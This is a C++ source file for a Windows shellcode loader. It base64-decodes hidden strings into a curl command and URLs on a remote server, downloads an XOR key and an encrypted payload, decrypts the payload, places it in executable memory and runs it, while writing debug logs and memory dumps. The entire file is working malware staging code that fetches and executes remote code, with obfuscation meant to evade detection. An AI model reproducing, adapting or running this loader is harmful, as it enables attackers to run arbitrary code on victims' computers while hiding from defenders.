#include <iostream>
#include <vector>
#include <windows.h>
#include <cstdio>
#include <sstream>
#include <string>
#include <fstream>

using namespace std;

string base64Decode(const string &encoded)
{
    static const string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    string decoded;
    vector<int> decoding_table(256, -1);
    for (int i = 0; i < 64; ++i)
        decoding_table[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : encoded)
    {
        if (decoding_table[c] == -1)
            continue;
        val = (val << 6) + decoding_table[c];
        valb += 6;
        if (valb >= 0)
        {
            decoded.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded;
}

void xorDecrypt(unsigned char *data, size_t size, unsigned char key)
{
    for (size_t i = 0; i < size; ++i)
    {
        data[i] ^= key;
    }
}

string runCommand(const string &command)
{
    char buffer[128];
    stringstream result;
    FILE *pipe = _popen(command.c_str(), "r");
    if (!pipe)
        return "";

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result << buffer;
    }

    _pclose(pipe);
    return result.str();
}

int main()
{
    ofstream debugFile("debug.log");

    string keyUrlEncoded = "aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9waXp6YS50eHQ=";
    string payloadUrlEncoded = "aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9mdW4uYmlu";
    string curlBase = "Y3VybCAtayAtcyA=";
    string authHeaderBase = "QXV0aG9yaXphdGlvbjogQmVhcmVyIA==";

    string keyUrl = base64Decode(keyUrlEncoded);
    string payloadUrl = base64Decode(payloadUrlEncoded);
    string curlBaseDecoded = base64Decode(curlBase);
    string authHeaderBaseDecoded = base64Decode(authHeaderBase);

    debugFile << "Decoded key URL: " << keyUrl << endl;
    debugFile << "Decoded payload URL: " << payloadUrl << endl;
    debugFile << "Decoded curl base: " << curlBaseDecoded << endl;
    debugFile << "Decoded auth header base: " << authHeaderBaseDecoded << endl;

    string keyCommand = curlBaseDecoded + " " + keyUrl;
    debugFile << "Key command: " << keyCommand << endl;
    string secretKeyStr = runCommand(keyCommand);
    while (!secretKeyStr.empty() && (secretKeyStr.back() == '\n' || secretKeyStr.back() == '\r' || secretKeyStr.back() == ' '))
    {
        secretKeyStr.pop_back();
    }

    if (secretKeyStr.empty())
    {
        debugFile << "Failed to fetch the decryption key." << endl;
        debugFile.close();
        return 1;
    }

    debugFile << "Fetched secret key: " << secretKeyStr << endl;

    // Convert the fetched string key to a single-byte numeric key
    unsigned char decryptionKey = static_cast<unsigned char>(stoi(secretKeyStr));

    string payloadCommand = curlBaseDecoded + " -H \"" + authHeaderBaseDecoded + secretKeyStr + "\" " + payloadUrl;
    debugFile << "Payload command: " << payloadCommand << endl;
    string payloadData = runCommand(payloadCommand);

    if (payloadData.empty())
    {
        debugFile << "Failed to fetch the payload." << endl;
        debugFile.close();
        return 1;
    }

    debugFile << "Fetched payload data (hex): ";
    for (unsigned char c : payloadData)
    {
        debugFile << hex << (int)c << " ";
    }
    debugFile << endl;

    vector<unsigned char> payload(payloadData.begin(), payloadData.end());

    // Decrypt payload
    xorDecrypt(payload.data(), payload.size(), decryptionKey);

    // Validate decryption
    debugFile << "Decrypted payload (hex): ";
    for (unsigned char c : payload)
    {
        debugFile << hex << (int)c << " ";
    }
    debugFile << endl;

    debugFile << "Decrypted payload (ASCII): ";
    for (unsigned char c : payload)
    {
        if (isprint(c))
            debugFile << c;
        else
            debugFile << "."; // Replace non-printable characters with dots
    }
    debugFile << endl;

    // Save decrypted payload for manual inspection
    ofstream decryptedFile("decrypted_payload.bin", ios::binary);
    decryptedFile.write(reinterpret_cast<const char *>(payload.data()), payload.size());
    decryptedFile.close();
    debugFile << "Decrypted payload saved to decrypted_payload.bin" << endl;

    // Allocate executable memory
    void *exec = VirtualAlloc(nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec)
    {
        debugFile << "VirtualAlloc failed." << endl;
        debugFile.close();
        return 1;
    }
    debugFile << "Memory allocated at: " << exec << endl;

    // Copy payload to allocated memory
    memcpy(exec, payload.data(), payload.size());
    debugFile << "Shellcode copied to allocated memory." << endl;

    // Save memory dump for validation
    ofstream memDump("memory_dump.bin", ios::binary);
    memDump.write(reinterpret_cast<const char *>(exec), payload.size());
    memDump.close();
    debugFile << "Memory dump saved to 'memory_dump.bin'." << endl;

    // Execute shellcode
    debugFile << "Executing shellcode..." << endl;
    ((void (*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);
    debugFile.close();
    return 0; // Ensure main function ends with a return statement
}